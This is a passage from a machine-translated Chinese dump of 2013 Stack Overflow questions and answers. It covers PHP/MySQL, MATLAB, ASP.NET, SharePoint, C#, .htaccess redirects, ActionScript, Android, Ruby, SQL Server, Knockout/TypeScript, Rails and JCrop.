> 时间：2013-04-24T23:51:56.937

你没有返回一个对象。您正在返回一个指针。任何地方都没有复制。

此外，您的第三个代码示例将永远无法工作，因为您说`b2World`的是 C++ 对象，这意味着它不可能响应 obj-c 消息。

此外，ARC 不会影响 C++ 的语义（除非您将 obj-c 对象嵌入为 C++ 对象的成员变量）。

# php - 来自链接查询结果的 PHP + MySQL 级联搜索

> ID：16204101
> 
> 赞同：2
> 
> 时间：2013-04-24T23:43:13.060
> 
> 标签：php, mysql

提前为文字墙道歉；不确定这是否可能，但我想我会问。我在网上查了一下，找不到我想要的东西。我已经学习了很多 PHP 和 MySQL，并且正处于开始编写自己的数据库驱动网站的阶段。我一直在练习的一个免费数据库是 eve_sdd_crucible_11 数据库，可从游戏网站免费获得。我一直在使用它，因为它很大，需要使用许多不同的技能才能充分利用它。

我想做一个简单的数据库进行探索。该数据库查询主要数据库的信息，根据搜索结果创建一个新表，还允许用户对他们找到的内容添加自己的评论。我准备好了各种查询，但是因为我不想要庞大的用户界面，所以我希望尽可能保持用户端干净。此应用程序需要查询和显示来自“mapregions”、“mapconstellations”、“mapsolarsystems”和“mapdenormalize”表的结果，并将这些信息插入到一个新数据库中，其中包含检索到的信息以及每个实体的注释框。

现在序言已经完成，这就是我想要做的：

查询'mapregions'（区域名称返回下次查询使用的区域ID）并显示结果（链接）->点击链接结果，查询'mapconstellations'（星座名称返回下次查询要使用的星座ID）并显示结果（已链接）-> 单击链接结果，查询“mapsolarsystems”（太阳系名称返回要在下一个查询中使用的太阳系 ID）并显示结果（已链接）-> 单击链接结果，查询“mapdenormalise”并显示所有实体在该系统中-> 将内容与每个列出的实体的注释框一起注入新数据库。

就像我在帖子前面所说的那样，我已经准备好查询设置了，我已经开始为页面设置 php，但我被困在如何将这些显示的结果链接到链中的下一个查询。所有结果都必须显示实体的名称，它是实体的相应 ID 号，用于执行链中的下一个查询。

不知道我是否已经解释得特别好，但这是我在这个晚上能做的最好的事情......任何帮助或指示将不胜感激，因为它开始引起我的注意；）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:56:07.747

需要查看连接 - 从阅读该文本开始，您似乎缺少对如何连接表的基本了解 - 在我看来，您的第 4 段听起来应该是一个查询。

每次搜索创建一个新的数据库和/或表表明您可能仍然缺少一些基础知识 - 因为这种方法永远不会扩展并且管理起来将是一场噩梦。

开始阅读 mysql joins：[Mysql Joins](http://dev.mysql.com/doc/refman/5.0/en/join.html)并从那里开始，查看连接如何工作的其他示例和现实世界的示例 - 这将极大地影响您如何继续构建它。

# image - 轴通过 imshow 不断改变大小

> ID：16204108
> 
> 赞同：0
> 
> 时间：2013-04-24T23:44:13.860
> 
> 标签：image, matlab, axes

我正在使用 imshow 绘制一个表示字母“A”的逻辑数组。我还有一个编辑框，用户可以在其中输入值来描述 x 和 y 方向上的切片数；即10,10。GUI 启动时，默认值为 10,10。如果我更改任何一个数字，新的逻辑数组将显示为 imshow 但现在它比我已经放置在 GUI 中的轴大。我已经包含了一些屏幕截图来显示正在发生的事情。另外，我注意到像素图图像大于我最初拥有的轴的大小（与示例图像的轴大小相同）。有没有办法解决这些问题？我想不通。

![默认](https://i.stack.imgur.com/NPm1Q.jpg)

![10x20](https://i.stack.imgur.com/T83Gj.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:32:49.027

看来问题是像素图被限制在 x 限制和 y 限制不够宽的轴上，可能是：

```
xlim = [1,10]
ylim = [1 10] 
```

要解决此问题，请尝试以下操作：

```
set(axH, 'XLim', [1 xGrid])
set(axH, 'YLim', [1 yGrid]) 
```

`axH`右边图中像素图的句柄在哪里，`xGrid`并且`yGrid`是您的像素图尺寸（例如，第二个示例中的 10 和 20）。

如果由于某种原因您无法访问轴句柄，您可以尝试使用直接修改它

```
xlim([1 xGrid])
ylim([1 yGrid]) 
```

绘制像素图后立即。

# asp.net - 如何在 CompositeDataBoundControl 中保留子控件

> ID：16204110
> 
> 赞同：2
> 
> 时间：2013-04-24T23:44:18.283
> 
> 标签：asp.net, viewstate, createchildcontrols

CompositeDataBoundControl 类 ( [http://msdn.microsoft.com/en-us/library/ms366539(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms366539(v=vs.100).aspx) ) 的文档说明如下：

> 这是扩展 DataBoundControl 类的基类，提供以下功能：
> 
> *   **实现复合控件所需的典型代码，包括在进行回发后从视图状态恢复控件的子控件层次结构的代码。**
> *   绑定到 IEnumerable 数据源并枚举数据以构建控件树。
> *   作为数据绑定控件的基础，例如 GridView 和 DetailsView。

谁能解释或展示如何创建一个 CompositeDataBoundControl 的示例，该控件将在 PostBack 之后保留其控件而无需手动调用 DataBind？我的例子太复杂了，不能post，但是比如你绑定一个ListView，每个item都会在PostBack之后渲染。该文档似乎表明从此类继承时将自动处理此问题，但我无法做到这一点。

我可以看到，即使我不调用 DataBind，每次回发后都会调用 CreateChildControls，但数据源是一个空对象的 IEnumerable（一个 DummyDataSource，与回发之前在原始数据源中传递的数量相同） . 看来我应该对这个集合做点什么，但我不确定要创建的控件类型取决于该项目的类型（在这种情况下，我绑定到 PropertyInfo 列表并创建某个类取决于属性的属性）。

感谢您的任何帮助，您可以提供！

# php - 添加 CSS 的 PHP 邮件程序

> ID：16204111
> 
> 赞同：0
> 
> 时间：2013-04-24T23:44:22.067
> 
> 标签：php, forms

我的 PHP 邮件表单运行良好，我只想添加最后一点。基本上我从这样的表格中提取信息：

```
$fields{"Comments"} = "Additional Comments by Fitter:  "; 
```

该字段的 HTML 为：

```
<textarea name="Comments" id="styled" onfocus="this.value=''" onblur="setbg('white')">Enter your comment here...</textarea> 
```

然后电子邮件将显示：

> Fitter 的其他评论：在此处输入您的评论...

我希望被拉出的信息是不同的颜色。我努力了：

```
$fields{"<span style='color:red;'>Comments</span>"} = "Additional Comments by Fitter:  "; 
```

但随后没有显示评论（我假设我没有正确包装它）。我有：

```
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n"; 
```

在文件的顶部也是如此。任何帮助都会很棒。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:49:31.340

您需要包装值，而不是键。

# sharepoint - SharePoint 高级列表关系

> ID：16204114
> 
> 赞同：0
> 
> 时间：2013-04-24T23:44:33.800
> 
> 标签：sharepoint, lookup, relation, relational

好的 - 这是前言。我意识到，SharePoint 并不是真正的最佳解决方案，如果我必须使用 SharePoint，那么编写代码会更好。但是，由于 IT 政策，我的翅膀被剪断了，他们没有时间“为我”做这件事。

我正在为环境管理系统开发文件控制系统。基本概念是有一个“一般责任”列表，其中标识了监管机构、一些类别信息、法律链接等......还有第二个列表“EMS责任”，基本上只是链接（通过查找) 一个特定的站点要一个一般的职责，来确定哪些站点有哪些职责。我们有许多站点，并且大多数站点都承担着最多的责任，因此将两个列表合并并重复所有这些内容 10 倍是没有意义的。最后，我有一个包含实际文档的文档库（为简单起见，我忽略了草稿/已发布的库方面）。这些文件应引用 EMS 责任，而后者又引用一般责任。

目前，我使用工作流自动将引用“一般责任”的辅助查找列复制到“EMS 职责”中的“单行文本”列，以便在“EMS 文档”中进行查找。但是，尽管两个责任列表中都存在这些值，但这些值不会传播到我的最终列表中。

这种基于工作流的方法是愚蠢的。查找列是愚蠢的。使用开箱即用的组件没有办法让它优雅地工作。我想相信这不起作用的原因是因为我遗漏了一些东西......但我已经搜索了几个小时并且找不到任何更有效的关系能力。

首先，关于为什么尽管引用了一行已填充的文本列，这些值没有出现在最终列表中的任何理论？

其次，是否有一种更好的整体方法，它不那么依赖于来回复制数据的工作流以及这些可悲的查找列？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T18:13:23.647

鉴于您在上面给出的要求以及您对我的问题的回答，我相信您不需要将所有三个项目链接在一起的工作流程。我有两个选择：

**第一个选项：**

1.  创建一般责任清单。此列表应至少包含两列。ID 和标题列。
2.  创建 EMS 责任清单。此列表应至少包含三列。ID、标题列和链接到一般责任列表的查阅列。
3.  创建文档库。添加链接到 EMS 职责的查找列。

由于您正在使用的查找列表已经链接到一般职责，因此不需要专门用于指向一般职责的另一列。但是，如果您需要在文档库中有特定的列，以便它明确地具有一般职责和 EMS 职责的列，请使用下面的选项 2。

**选项 2**

1.  创建一般责任清单。此列表至少应包含 ID 和 Title 列。

2.  创建 EMS 责任清单。此列表应至少包含 ID、链接到一般责任和标题列的查找列。

3.  创建文档库。您应该添加两个查找列。一个指向一般责任，另一个指向 EMS 责任。

    （现在有趣的部分开始了）

4.  按照指南在此[链接](http://spservices.codeplex.com/wikipage?title=$%28%29.SPServices.SPCascadeDropdowns)中编辑您的 NewForm 和 EditForm aspx，以便您的查找下拉列表将成为级联下拉列表。这将确保只有在您从“常规”下拉列表中选择一个值后，才会填充 EMS 下拉列表中的项目。

如果您需要更多说明，请告诉我。

# c# - C#中的DLL入口点在哪里？

> ID：16204117
> 
> 赞同：0
> 
> 时间：2013-04-24T23:45:05.510
> 
> 标签：c#, dll, embed, .net-assembly

我目前正在尝试在另一个 dll 中嵌入一个 DLL（作为资源），但我遇到了一个小问题。

**DLL 入口点在哪里？**我的意思是，在 WPF 中我会有一个*app.xaml.cs*文件，但是如果我的项目本身就是一个库呢？

比方说，我应该在哪里进行编程，`AppDomain.CurrentDomain.AssemblyResolve`以便从资源中选择它？我没有一个程序类来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T23:46:52.853

DLL 没有入口点。
相反，根据需要加载和使用类。

`AssemblyResolve`在使用来自其他程序集的任何类型之前，您应该简单地调用`Assembly.Load`静态初始化程序，而不是处理。

# c# - 播放视频时打开计时器？

> ID：16204123
> 
> 赞同：0
> 
> 时间：2013-04-24T23:46:25.633
> 
> 标签：c#, wpf, windows, timer, media

无论如何，如果播放电影，您可以暂停计时器吗？我问的原因是因为我使用的`MediaElement`是同时使用图像和视频的，因此我必须找到一个解决方案来在播放电影时打开计时器。

像这样的东西：

如果正在播放电影

`DispatcherTimer.Stop`

...

否则，如果电影没有播放

`DispatcherTimer.Start`

类似的东西？

我已经有一个代码来检查文件是图像还是视频。我需要的只是在播放电影时帮助打开计时器。

我正在使用计时器每 20 秒更换一次图片。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T03:19:52.363

将 MediaElement 的 LoadedBehaviour 和 UnloadedBehaviour 属性设置为手动。然后您将能够控制视频的开始、暂停和停止。一旦你这样做了，剩下的就是在你停止/暂停视频时启动计时器，反之亦然。像这样的东西：

```
 //myvideo is a <MediaElement/>
    private void cmdStart_Click(object sender, RoutedEventArgs e)
    {
        myvideo.Play();
        DispatcherTimer.Stop();
    }

    private void cmdStop_Click(object sender, RoutedEventArgs e)
    {
        myvideo.Stop();
        DispatcherTimer.Start();
    }

    private void cmdPause_Click(object sender, RoutedEventArgs e)
    {
        myvideo.Pause();
        DispatcherTimer.Start();
    } 
```

# .htaccess - 我想将所有 http 请求重定向到 https，并将所有 www 请求重定向到非 www

> ID：16204124
> 
> 赞同：1
> 
> 时间：2013-04-24T23:46:27.370
> 
> 标签：.htaccess, mod-rewrite

这是我当前的 .htaccess 文件：

```
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteCond %{HTTPS} !=on
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /index.php
</IfModule> 
```

我想将所有http请求重定向到https，将所有www请求重定向到非www，并将所有文件请求重定向到index.php

例如：

[http://www.example.com](http://www.example.com)到[https://example.com](https://example.com)

[https://www.example.com](https://www.example.com)到[https://example.com](https://example.com)

[http://example.com/file.php](http://example.com/file.php)到[https://example.com/index.php](https://example.com/index.php)

除了 www 部分，一切似乎都在工作。请帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T07:23:44.080

> `http://www.example.com` 到`https://example.com`
> `https://www.example.com` 到`https://example.com`
> `http://example.com/file.php`到`https://example.com/index.php`

也许这会起作用：

```
RewriteEngine On

# Remove www from https requests. 
# Next 3 lines must be placed in one .htaccess file at SSL root folder, 
# if different from non-ssl.
RewriteCond %{HTTPS} on
RewriteCond %{HTTP_HOST}  ^www\.(.+) [NC]
RewriteRule ^(.*) https://%1/$1 [R=301,L]

# Redirect all http to https
RewriteCond %{HTTPS} off
RewriteCond %{HTTP_HOST} (?:www\.)?(.+)  [NC]
RewriteRule ^(.*) https://%1/$1     [R=301,L] 
```

如果还是不行，换个试试

`RewriteCond %{HTTPS} off`或`on`与

`RewriteCond %{HTTP:X-Forwarded-SSL} off`或者`on`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:57:15.170

您可以添加处理 www 部分的附加规则

```
RewriteCond %{HTTP_HOST} ^www\.(.+)$
RewriteRule ^ https://%1%{REQUEST_URI} [L,R] 
```

[`RewriteCond`](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond)捕获之后的所有内容并在as`www.`中使用它。[`RewriteRule`](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewriterule)`%1`

当一切按预期工作时，您可以更改`R`为`R=301`.

*永远不要*在启用的情况下进行测试，有关详细信息`301`，请参阅此答案 [提示调试 .htaccess 重写规则](https://stackoverflow.com/a/9204355/1741542) 。

# actionscript-3 - 基本 TextFormat 更改无济于事

> ID：16204125
> 
> 赞同：0
> 
> 时间：2013-04-24T23:46:32.603
> 
> 标签：actionscript-3, flash, textfield, textformat

代码：

```
var BoldTextFormat:TextFormat = new TextFormat();
BoldTextFormat.bold = true;
weapons[player.activeWeapon].weaponName.defaultTextFormat = BoldTextFormat; 
```

这看起来很简单，但它什么也没做！文本根本没有变得粗体。

使用`weapons[player.activeWeapon].weaponName.setTextFormat(BoldTextFormat);`也无济于事。

这些`trace`：

```
trace(weapons[player.activeWeapon].weaponName);
trace(weapons[player.activeWeapon].weaponName.defaultTextFormat);
trace(BoldTextFormat); 
```

结果在此输出中：

```
[object TextField]
[object TextFormat]
[object TextFormat] 
```

这是我要加粗的文本字段：

![http://i.stack.imgur.com/z2f0B.png](https://i.stack.imgur.com/z2f0B.png)

我嵌入了粗体字体：

![http://i.imgur.com/l9qJ95X.png](https://i.imgur.com/l9qJ95X.png)

什么可能是错的？没有**错误**。跟踪文本字段的文本会显示正确的文本，所以这不是问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T23:47:41.453

尝试 ：

```
 weapons[player.activeWeapon].weaponName.setTextFormat(BoldTextFormat); 
```

`defaultTextFormat`适用于设置格式后添加的文本，如果要更改已设置文本的格式，则应使用`setTextFormat`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T23:54:22.713

您可能需要嵌入粗体字体，您的图像显示“常规”字体。

好的，我发现了这里的魔力。它开始为您工作的可能原因是您实际上为您的字段设置了粗体字体。

但这里的魔力。在库中，右键单击粗体字体并选择属性。然后转到操作脚本设置并启用：

导出动作脚本

接下来，在您的代码中，您需要添加以下行：

```
BoldTextFormat.font = "Times New Roman Bold"; 
```

那应该行得通。

可悲的是，TextFormat 的 .bold 似乎不会自动找到粗体版本。

# crash - 多次点击创建索引越界异常

> ID：16204126
> 
> 赞同：1
> 
> 时间：2013-04-24T23:46:42.980
> 
> 标签：crash, multi-touch

我正在改编 Mario Zechner 的*Beginning Android Games*框架来创建一个幼儿颜色学习应用程序。在测试的最后阶段，我发现如果用户同时按下和释放两个不同的按钮（例如下面屏幕截图中的“设置”和“主页”按钮），“颜色！”已停止。出现通知。![在此处输入图像描述](https://i.stack.imgur.com/z73pE.jpg)

Zechner 的框架以列表的形式提供对输入的处理，然后单独处理每个输入。我相信问题在于代码的@Override 更新区域：

```
@Override
public void update(float deltaTime) {
    world.timer = world.timer + deltaTime;

    List<TouchEvent> touchEvents = game.getInput().getTouchEvents();
    int len = touchEvents.size();

    for (int i = 0; i < len; i++) {
        TouchEvent event = touchEvents.get(i);

        if (event.type == TouchEvent.TOUCH_UP) {
            // This is where the guts of my app are
        }
    }
} 
```

以下来自显示异常的 LogCat（我注意到“无效索引”会根据使用的触摸次数而有所不同，但大小始终为 0）：

```
04-24 19:27:55.239: E/AndroidRuntime(28002): FATAL EXCEPTION: Thread-555
04-24 19:27:55.239: E/AndroidRuntime(28002): java.lang.IndexOutOfBoundsException: Invalid index 1, size is 0
04-24 19:27:55.239: E/AndroidRuntime(28002):    at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:251)
04-24 19:27:55.239: E/AndroidRuntime(28002):    at java.util.ArrayList.get(ArrayList.java:304)
04-24 19:27:55.239: E/AndroidRuntime(28002):    at com.lilyandrosieshow.colors.GameScreen.update(GameScreen.java:153)
04-24 19:27:55.239: E/AndroidRuntime(28002):    at com.badlogic.androidgames.framework.impl.AndroidFastRenderView.run(AndroidFastRenderView.java:42)
04-24 19:27:55.239: E/AndroidRuntime(28002):    at java.lang.Thread.run(Thread.java:856)
04-24 19:28:59.301: D/dalvikvm(28002): GC_CONCURRENT freed 482K, 4% free 15473K/16071K, paused 2ms+2ms
04-24 19:32:55.262: I/Process(28002): Sending signal. PID: 28002 SIG: 9
04-24 19:32:55.262: E/AndroidRuntime(28002): Handle UnCaght exceptions. KILLING PID: 28002 
```

我试图添加

```
if (len != 0) 
```

在 for 循环之前但收到相同的结果

感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-23T00:49:38.040

“设置”和“主页”按钮通向另一个`Screen`实现，例如`game.setScreen(new HomeScreen())`. 在该方法中，`Screen`参数更新为增量时间为零。如果参数`Screen`的 update 方法还通过从游戏实例的事件中获取触摸事件来迭代它们`UserInput`，则当前事件列表不再与旧的被迭代的事件列表相同`Screen`。解决方法是立即从对 的任何调用中返回`setScreen()`。无需继续触摸处理。

```
@Override
public void update(float deltaTime) {
    world.timer = world.timer + deltaTime;

    List<TouchEvent> touchEvents = game.getInput().getTouchEvents();
    int len = touchEvents.size();

    for (int i = 0; i < len; i++) {
        TouchEvent event = touchEvents.get(i);

        if (event.type == TouchEvent.TOUCH_UP) {
            if (touchingHomeButton(event)) {
                game.setScreen(new HomeScreen());
                return; // return immediately
        }
    }
} 
```

# ruby - sublime text 2 带有分号错误的红宝石块

> ID：16204132
> 
> 赞同：1
> 
> 时间：2013-04-24T23:47:25.740
> 
> 标签：ruby, block, sublimetext2

当我尝试在管道字符中使用分号时，我正在尝试一个简单的 Ruby 程序来了解块并不断遇到构建错误。

如果我在终端中使用 运行文件`ruby name_of_program.rb`，那么一切运行正常。只有当我尝试在 Sublime Text 中构建时，我才会收到错误消息。

这是在 Sublime Text 2 中出错但在它之外运行良好的程序：

```
x = 10

5.times do |x|
  puts "x inside the block: #{x}"
end

puts "x outside the block: #{x}"

x = 10
5.times do |y|
  x = y
  puts "x inside the block: #{x}"
end
puts "x outside the block: #{x}"

x = 10
5.times do |y; x|
  x = y
  puts "x inside the block #{x}"
end
puts "x outside the block #{x}" 
```

和错误：

```
block_variables_ex.rb:21: syntax error, unexpected ';', expecting '|'
5.times do |y; x| 
```

关于我可能做错了什么的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:19:25.130

关于您遇到的确切错误，这已在“ [Ruby：块参数中的意外分号”中得到解答。](https://stackoverflow.com/questions/8963520/ruby-unexpected-semicolon-in-block-parameters)听起来 Sublime 可能正在访问旧版本的 Ruby。

检查您的路径，看看那里是否有两个版本的 Ruby，并删除所有对 Ruby 1.8 的引用。

# sql - 如何对 SQL Server CTE 的结果执行存储过程

> ID：16204139
> 
> 赞同：2
> 
> 时间：2013-04-24T23:47:58.250
> 
> 标签：sql, sql-server, tsql

我有一个返回 DISTINCT ID 的 CTE。我想对每个返回的 Id 执行一个标量函数。

```
WITH cte (reqID) as 

(SELECT DISTINCT pol.ReqID FROM 
LOG_PackingListItems pli
JOIN
v_PO_LN              pol on pol.PO_ID  = pli.PoId
WHERE  
pli.PackingListHeaderID = 1)

EXEC dbo.spUpdateLOG_ReqCompleteCheck  reqID -- Error "Incorrect Syntax near EXEC" 
```

EXEC 行是我想要做的，但我得到一个语法错误。不确定我想做的事情是否可行，或者我是否确实有语法错误。有任何想法吗？

**编辑：** 我正在添加存储过程的代码，因为我现在使用 realnumber3012 建议的表值参数

**编辑：** 我已经更改了我的 CTE 代码，因此它按照 realnumber 的建议填充了表格类型。现在执行 spUpdateLOG_ReqCompleteCheck “子查询返回多个值”时出现错误。

```
DECLARE @ReqIdTVP as ReqIdType;
DELETE FROM @ReqIDTVP;
with cte (reqID) as 
(select distinct pol.ReqID from 
 LOG_PackingListItems pli
 join
 v_PO_LN    pol on pol.PO_ID  = pli.PoId
 where 
  pli.PackingListHeaderID = @PackingListHeaderID)

INSERT INTO @ReqIdTVP 
SELECT * FROM cte

EXEC dbo.spUpdateLOG_ReqCompleteCheck @ReqIdTVP 
```

存储过程代码：

```
Alter PROCEDURE spUpdateLOG_ReqCompleteCheck

(@ReqIdTVP ReqIdType READONLY )  

AS 
BEGIN

DECLARE @TotalOrd int
DECLARE @TotalRx int
DECLARE @ReqID char(8)  

SET @ReqID = (SELECT  ReqID FROM @ReqIdTVP)

SET @TotalOrd = (SELECT ISNULL(SUM(ORD_QTY),0)
            FROM        dbo.v_PoLnNonFreight  l
            WHERE l.ReqID = @reqID)

SET @TotalRx = (SELECT  ISNULL(SUM(TotalRxSite),0)
            FROM        dbo.v_PoLnNonFreight  l
            WHERE l.ReqID = @reqID)

IF @TotalRx >=  @TotalOrd
 BEGIN
  DECLARE @curDate datetime
  SET @CurDate = ISNULL(@CurDate,GetDate()) 
SET NOCOUNT ON;

  UPDATE LOG_ReqHeader   
  SET 
ReqCompleteDate   = @curDate,
ReqStatus = 'Complete'

  WHERE ReqID = @ReqID  
 END
END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T21:52:13.897

似乎您的存储过程唯一要做的就是更新日志记录表：（它仅通过此语句更改*状态*并且不返回任何内容？？？？

```
UPDATE LOG_ReqHeader   
  SET 
ReqCompleteDate   = @curDate,
ReqStatus = 'Complete'

  WHERE ReqID = @ReqID 
```

如何将逻辑拆分并编写一个函数（如果可能的话，内联将评估您正在寻找的条件（并不真正了解您在那里做什么） - 在 CTE 的结果上运行该函数（将其包装在如果需要，可以使用另一个 CTE）与 CROSS APPLY OPERATOR。

您最终会得到一个类似于 [ReqId]、[UpdateLog] 的结果集（其中 updateLog 是一个 BIT）

然后只需对结果进行基于集合的更新：

```
UPDATE l SET
    ReqCompleteDate   = @curDate,
    ReqStatus = 'Complete'
FROM
    LOG_ReqHeader AS l
    JOIN <CTE> AS c ON c.[ReqID] = l.[ReqID]
WHERE
    c.[UpdateLog] = 0x1 
```

这有道理吗？

# knockout.js - 如何在打字稿中定义敲除绑定处理程序？

> ID：16204142
> 
> 赞同：41
> 
> 时间：2013-04-24T23:48:03.820
> 
> 标签：knockout.js, typescript, definitelytyped

我通常通过在 JavaScript 中添加自定义[**敲除**](http://knockoutjs.com) [**绑定处理程序**](http://knockoutjs.com/documentation/custom-bindings.html)

```
ko.bindingHandlers.myBindingHandler = {...} 
```

但现在我必须通过在[**TypeScript中添加它们**](http://www.typescriptlang.org/)

```
ko.bindingHandlers["myBindingHandler"] = {...} 
```

否则我会收到此错误，因为我正在使用[**typescript.d.ts**](https://github.com/borisyankov/DefinitelyTyped/blob/master/knockout/knockout.d.ts)：

> “KnockoutBindingHandlers”类型的值上不存在属性“myBindingHandler”

我不喜欢这种`["property"]`方法，因为以后我无法引用它或获得智能感知。

[**那么，如何在使用肯定类型的淘汰赛定义的**](http://nuget.org/packages/knockout.TypeScript.DefinitelyTyped/)同时将我的自定义绑定处理程序添加到淘汰赛，同时还能够通过智能感知等引用我的定义？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2013-04-24T23:48:30.963

## 定义自定义绑定处理程序

它实际上非常简单，只需~~在定义自定义绑定处理程序之前~~`myBindingHandler`将它 ( ) 添加到`KnockoutBindingHandlers`接口。 **请注意，您必须在1.0 版（或更早版本）****的文件中对界面进行此添加。**~~**`.d.ts`**~~

 ~~**bindingHandlers.d.ts**

```
/// <reference path="typings/knockout/knockout.d.ts" />

interface KnockoutBindingHandlers {
    myBindingHandler: KnockoutBindingHandler;
} 
```

**myBindingHandler.ts**

```
/// <reference path="bindingHandler.d.ts" />

ko.bindingHandlers.myBindingHandler = {...} 
```

现在一切正常。这不会覆盖任何现有的定义或声明，因此您的定义将位于`ko.bindingHandlers.text`等 旁边。

请小心，因为如果您不包含 的实际定义`myBindingHandler`并且您在其他地方引用它，它将由于您添加到的定义而编译`KnockoutBindingHandlers`，但它会在运行时中断，因为没有`myBindingHandler`.

在 knockoutjs 中添加自定义绑定处理程序的文档在**[这里](http://knockoutjs.com/documentation/custom-bindings.html)**

## 使用 fn 通过 TypeScript 添加自定义函数

同样，要向 中添加一些`ko.observable.fn`内容，您可以在 typescript 中执行此操作

```
interface KnockoutObservableFunctions  { 
    myFnExtension(args: any): returnType; 
} 
```

并调用它

```
// x will be defined as a returnType automatically, but you could specify it if you like, either way
var x: returnType = ko.observable("value").myFnExtension(args); 
```

`subscribable`注意： 、`observable`、`observableArray`和`computed`类型有不同的接口：

*   `ko.subscribable.fn`... 添加`KnockoutSubscribableFunctions`
*   `ko.observable.fn`... 添加`KnockoutObservableFunctions`
*   `ko.observableArray.fn`... 添加`KnockoutObservableArrayFunctions`
*   `ko.computed.fn`... 添加`KnockoutComputedFunctions`

在 knockoutjs 中添加到 fn 的文档在**[这里](http://knockoutjs.com/documentation/fn.html)**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-05-29T17:23:09.273

您可以简单地**忽略它**，但这**不是一个好习惯**，通过强制转换为`any`您并没有定义属性的类型`myBindingHandler`

```
(<any>ko.bindingHandlers).myBindingHandler = { ... }; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-11-06T11:00:19.430

另一种忽略任何类型检查的肮脏方式：

```
let bindingHandlers: any = ko.bindingHandlers;
bindingHandlers.myHandler = {...} 
```~~

# ruby-on-rails - Rails 在更新时发现永久链接错误

> ID：16204145
> 
> 赞同：0
> 
> 时间：2013-04-24T23:48:21.177
> 
> 标签：ruby-on-rails

我尝试在我的应用程序中使用编辑产品，但是当我点击编辑时，我会转到这个网址：

[http://0.0.:3000/admin/products/1/edit](http://0.0.:3000/admin/products/1/edit)

好的，没关系，我的路线是

```
 resources :products

  namespace :admin do  
    resources :products  
  end 
```

但是当我点击更新时，会出现这个错误：

```
Couldn't find Product with id=capa-para-iphone-4-silicone 
```

我理解了这个错误，但我不知道，因为当我在编辑和更新中放入我的控制器时，永久链接找到了什么：

```
@product = Product.find(params[:id]) 
```

我使用 gem has_permalink，但我把这个 gem 放了一些。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:16:31.987

在控制器的更新方法中使用它：

```
@product = Product.find_by_permalink(params[:id]) 
```

# javascript - 有没有办法使用 JCrop 裁剪比实际图像更大的区域？

> ID：16204146
> 
> 赞同：14
> 
> 时间：2013-04-24T23:48:22.393
> 
> 标签：javascript, jcrop

据我所知，[JCrop](https://github.com/tapmodo/Jcrop)不会让我进行设置，以便用户可以在实际图像*之外*裁剪并包括周围的空白。有没有办法做到这一点？

为了帮助解释我的意思，假设我们将作物的比例限制在 16:9。这适用于具有自然宽主题的图像：

![在此处输入图像描述](https://i.stack.imgur.com/1edMI.png)

但有时用户想要使用的源图像并不能很好地适应所需的比例：

![在此处输入图像描述](https://i.stack.imgur.com/N4tf9.png)

相反，我们希望通过使裁剪区域大于图像本身来允许它们包含图像*之外的空间：*

![在此处输入图像描述](https://i.stack.imgur.com/3mdFA.png)

我一直在搞乱 JCrop 并浏览手册和谷歌一段时间，看起来这是不可能的（不修改 JCrop）。我错了吗？如果是这样，你怎么做？

FWIW，在这种情况下，实际图像将是产品/组织徽标图像，它们具有多种宽高比，并且几乎总是人们可用的图像在文本/图像周围几乎没有空白。这意味着任何仅限于图像边界的固定纵横比裁剪几乎肯定会切断图像的顶部+底部或左侧+右侧。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-08-01T08:53:19.217

我的解决方案是创建一个方形尺寸等于图像最大边的临时画布。我将画布背景设为白色，并将图像添加到中心。然后我创建了一个新图像并将画布用作图像源。然后我将该图像与 jcrop 一起使用。它速度较慢，但​​它有效！

这是一个例子：

```
img.onload = function(){ 
    // get the largest side of the image
    // and set the x and y coordinates for where the image will go in the canvas
    if( img.width > img.height ){
        var largestDim = img.width;
        var x = 0;
        var y = (img.width-img.height)/2;
    }
    else{
        var largestDim = img.height;
        var y = 0;
        var x = (img.height-img.width)/2;
    }
    // create a temporary canvas element and set its height and width to largestDim
    canvastemp = document.createElement("canvas");
    canvastemp.width = canvastemp.height = largestDim;
    var ctx = canvastemp.getContext('2d');
    // set the canvas background to white
    ctx.fillStyle="#FFFFFF";
    ctx.fillRect(0, 0, canvastemp.width, canvastemp.height);
    // center the image in the canvas
    ctx.drawImage(img, x, y, img.width, img.height);
    // create a new image and use the canvas as its source
    var squaredImg = document.createElement("img");
    squaredImg.src = canvastemp.toDataURL();
    // add jcrop once the image loads
    squaredImg.onload = function(){
        addJcrop(squaredImg);   
    }
};

function addJcrop(img){
   // your jcrop code
} 
```

这样，用户可以根据需要选择将整个图像包含在裁剪中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-07-01T12:03:43.010

考虑使用 php imagick 之类的东西将照片转换为照片 + 透明大背景，然后将其放入 JCrop 我认为不可能有其他方式

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-11-04T08:41:54.827

